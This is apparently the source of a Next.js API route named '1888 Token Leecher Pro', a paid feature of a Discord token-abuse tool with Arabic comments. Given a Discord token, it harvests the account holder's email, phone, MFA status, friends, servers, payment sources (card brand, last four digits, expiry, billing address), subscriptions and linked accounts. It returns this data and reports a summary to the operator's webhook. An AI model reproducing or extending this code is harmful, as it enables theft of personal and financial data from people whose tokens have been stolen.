import { NextRequest, NextResponse } from 'next/server'
import { discordFetch, cleanToken } from '@/lib/discord'
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit'
import { checkPrimeFromProof } from '@/lib/prime-store'
import { sendToWebhook } from '@/lib/webhook'
import { getLogWebhookUrl } from '@/lib/config'

/* ===== 1888 Token Leecher Pro - Prime =====
 * استخراج بيانات الحساب بشكل أعمق
 * - friends list + IDs
 * - guilds + roles + joined dates
 * - billing info + connections
 * - email + phone
 * - تصدير كـ JSON
 */

export async function POST(request: NextRequest) {
  const rlIp = getClientIp(request)
  const rl = rateLimit(`${rlIp}:token-leecher-pro`, RATE_LIMITS.medium)
  if (rl.limited) {
    return NextResponse.json({
      success: false,
      error: rl.cooldownActive ? 'فترة تهدئة - انتظر قليلاً' : 'تم تجاوز الحد المسموح'
    }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } })
  }

  try {
    const body = await request.json().catch(() => ({}))
    const { token, options } = body

    if (!token) return NextResponse.json({ success: false, error: 'التوكن مطلوب' }, { status: 400 })

    const ct = cleanToken(token)

    // تحقق من Prime
    const userRes = await discordFetch(ct, 'GET', '/users/@me')
    if (!userRes.ok) return NextResponse.json({ success: false, error: 'توكن غير صالح' }, { status: 400 })
    const user = userRes.data as { id: string; username: string }
    const primeProof = body.primeProof; if (!await checkPrimeFromProof(primeProof, user.id)) {
      return NextResponse.json({ success: false, error: 'هذه الميزة حصرية لأعضاء Prime' }, { status: 403 })
    }

    const fetchFriends = options?.friends !== false
    const fetchGuilds = options?.guilds !== false
    const fetchBilling = options?.billing !== false
    const fetchConnections = options?.connections !== false
    const fetchProfile = options?.profile !== false

    const data: any = { user: { id: user.id, username: user.username } }
    const logs: string[] = [`🔍 بدء استخراج بيانات: ${user.username}`]

    // 1. معلومات الحساب الكاملة
    if (fetchProfile) {
      logs.push('👤 جلب معلومات الحساب...')
      const me = userRes.data as any
      data.profile = {
        id: me.id,
        username: me.username,
        global_name: me.global_name || '',
        discriminator: me.discriminator || '0',
        avatar: me.avatar ? `https://cdn.discordapp.com/avatars/${me.id}/${me.avatar}.${me.avatar.startsWith('a_') ? 'gif' : 'png'}?size=256` : null,
        banner: me.banner ? `https://cdn.discordapp.com/banners/${me.id}/${me.banner}.${me.banner.startsWith('a_') ? 'gif' : 'png'}?size=512` : null,
        bio: me.bio || '',
        email: me.email || 'مخفي',
        phone: me.phone || 'مخفي',
        verified: me.verified || false,
        mfa_enabled: me.mfa_enabled || false,
        flags: me.flags || 0,
        premium_type: me.premium_type || 0,
        locale: me.locale || 'مخفي',
        nsfw_allowed: me.nsfw_allowed || false
      }
      logs.push(`✅ البريد: ${data.profile.email}, الهاتف: ${data.profile.phone}`)
    }

    // 2. قائمة الأصدقاء
    if (fetchFriends) {
      logs.push('👥 جلب قائمة الأصدقاء...')
      const friendsRes = await discordFetch(ct, 'GET', '/users/@me/relationships')
      if (friendsRes.ok) {
        const friends = (friendsRes.data as any[]) || []
        data.friends = friends.map(f => ({
          id: f.id,
          username: f.user?.username || '',
          global_name: f.user?.global_name || '',
          type: f.type,  // 1 = friend
          avatar: f.user?.avatar ? `https://cdn.discordapp.com/avatars/${f.id}/${f.user.avatar}.${f.user.avatar.startsWith('a_') ? 'gif' : 'png'}?size=128` : null
        }))
        logs.push(`✅ ${data.friends.length} صديق`)
      }
    }

    // 3. السيرفرات
    if (fetchGuilds) {
      logs.push('🏰 جلب قائمة السيرفرات...')
      const guildsRes = await discordFetch(ct, 'GET', '/users/@me/guilds?with_counts=true')
      if (guildsRes.ok) {
        const guilds = (guildsRes.data as any[]) || []
        data.guilds = guilds.map(g => ({
          id: g.id,
          name: g.name,
          owner: g.owner || false,
          permissions: g.permissions,
          joined_at: g.joined_at || '',
          approximate_member_count: g.approximate_member_count || 0,
          approximate_presence_count: g.approximate_presence_count || 0,
          icon: g.icon ? `https://cdn.discordapp.com/icons/${g.id}/${g.icon}.png` : null
        }))
        logs.push(`✅ ${data.guilds.length} سيرفر`)
      }
    }

    // 4. معلومات الدفع
    if (fetchBilling) {
      logs.push('💳 جلب معلومات الدفع...')
      const billingRes = await discordFetch(ct, 'GET', '/users/@me/billing/payment-sources')
      if (billingRes.ok) {
        const billing = (billingRes.data as any[]) || []
        data.billing = billing.map(b => ({
          id: b.id,
          type: b.type,  // 1 = card, 2 = paypal
          brand: b.brand || '',
          last4: b.last_4 || '',
          expires_month: b.expires_month || 0,
          expires_year: b.expires_year || 0,
          billing_address: b.billing_address || null
        }))
        logs.push(`✅ ${data.billing.length} طريقة دفع`)
      }

      // subscriptions
      const subRes = await discordFetch(ct, 'GET', '/users/@me/billing/subscriptions')
      if (subRes.ok) {
        const subs = (subRes.data as any[]) || []
        data.subscriptions = subs.map(s => ({
          id: s.id,
          type: s.type,
          plan_id: s.plan_id,
          status: s.status,
          current_period_end: s.current_period_end ? new Date(s.current_period_end).toISOString() : null,
          canceled_at: s.canceled_at ? new Date(s.canceled_at).toISOString() : null
        }))
      }
    }

    // 5. الربطات (Connections)
    if (fetchConnections) {
      logs.push('🔗 جلب الربطات...')
      const connRes = await discordFetch(ct, 'GET', '/users/@me/connections')
      if (connRes.ok) {
        const conns = (connRes.data as any[]) || []
        data.connections = conns.map(c => ({
          type: c.type,  // steam, xbox, etc.
          name: c.name,
          id: c.id,
          verified: c.verified,
          friend_sync: c.friend_sync,
          show_activity: c.show_activity,
          visibility: c.visibility
        }))
        logs.push(`✅ ${data.connections.length} ربطة`)
      }
    }

    // ملخص
    data.summary = {
      username: data.profile?.username || user.username,
      email: data.profile?.email || 'مخفي',
      phone: data.profile?.phone || 'مخفي',
      friendsCount: data.friends?.length || 0,
      guildsCount: data.guilds?.length || 0,
      billingCount: data.billing?.length || 0,
      connectionsCount: data.connections?.length || 0,
      nitroType: data.profile?.premium_type || 0,
      mfaEnabled: data.profile?.mfa_enabled || false
    }

    logs.push('✅ اكتمل الاستخراج!')

    // webhook log
    sendToWebhook({
      username: '1888 Token Leecher Pro',
      embeds: [{
        title: '🔍 استخراج بيانات حساب',
        color: 0x34d399,
        fields: [
          { name: '👤 المستخدم', value: user.username, inline: true },
          { name: '🆔 ID', value: user.id, inline: true },
          { name: '👥 أصدقاء', value: String(data.summary.friendsCount), inline: true },
          { name: '🏰 سيرفرات', value: String(data.summary.guildsCount), inline: true },
          { name: '💳 دفع', value: String(data.summary.billingCount), inline: true },
          { name: '🔗 ربطات', value: String(data.summary.connectionsCount), inline: true }
        ],
        footer: { text: '1888 • Prime Feature' },
        timestamp: new Date().toISOString()
      }]
    }, getLogWebhookUrl()).catch(() => {})

    return NextResponse.json({
      success: true,
      data,
      summary: data.summary,
      logs
    })
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع'
    return NextResponse.json({ success: false, error: message }, { status: 500 })
  }
}
